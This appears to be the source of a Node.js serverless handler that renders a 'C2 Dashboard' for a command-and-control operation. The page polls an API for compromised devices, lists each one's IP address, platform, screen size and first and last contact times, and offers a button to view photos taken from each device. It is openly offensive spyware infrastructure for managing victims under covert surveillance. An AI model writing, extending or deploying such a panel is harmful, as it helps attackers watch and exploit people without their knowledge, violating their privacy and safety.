module.exports = (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Dashboard</title>
            <style>
                *{margin:0;padding:0;box-sizing:border-box}
                body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:30px}
                h1{color:#f7971e;margin-bottom:20px}
                .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
                .card{background:#1a1a2e;border-radius:16px;padding:18px;border:1px solid #2a2a44}
                .card h3{color:#88ccff;margin-bottom:8px}
                .card .info{font-size:13px;color:#aab;line-height:1.7}
                .card .info .label{color:#4a6a7a}
                .btn{background:#f7971e;border:none;padding:6px 16px;border-radius:30px;color:#0a0a12;font-weight:600;cursor:pointer;margin-top:8px}
                .btn:hover{transform:scale(1.02)}
            </style>
        </head>
        <body>
            <h1>☠️ C2 Dashboard (Vercel + Supabase)</h1>
            <div id="devices" class="grid">Loading...</div>
            <script>
                async function load() {
                    const resp = await fetch('/api/devices');
                    const devices = await resp.json();
                    const container = document.getElementById('devices');
                    container.innerHTML = '';
                    for (const d of devices) {
                        const card = document.createElement('div');
                        card.className = 'card';
                        card.innerHTML = \`
                            <h3>\${d.ip || 'Unknown IP'}</h3>
                            <div class="info">
                                <div><span class="label">Device:</span> \${d.platform || 'Unknown'}</div>
                                <div><span class="label">Screen:</span> \${d.screen || 'Unknown'}</div>
                                <div><span class="label">First seen:</span> \${new Date(d.first_seen).toLocaleString()}</div>
                                <div><span class="label">Last seen:</span> \${new Date(d.last_seen).toLocaleString()}</div>
                            </div>
                            <button class="btn" onclick="window.open('/api/photos?deviceId='+encodeURIComponent('\${d.id}'))">View Photos</button>
                        \`;
                        container.appendChild(card);
                    }
                }
                load();
                setInterval(load, 15000);
            </script>
        </body>
        </html>
    `);
};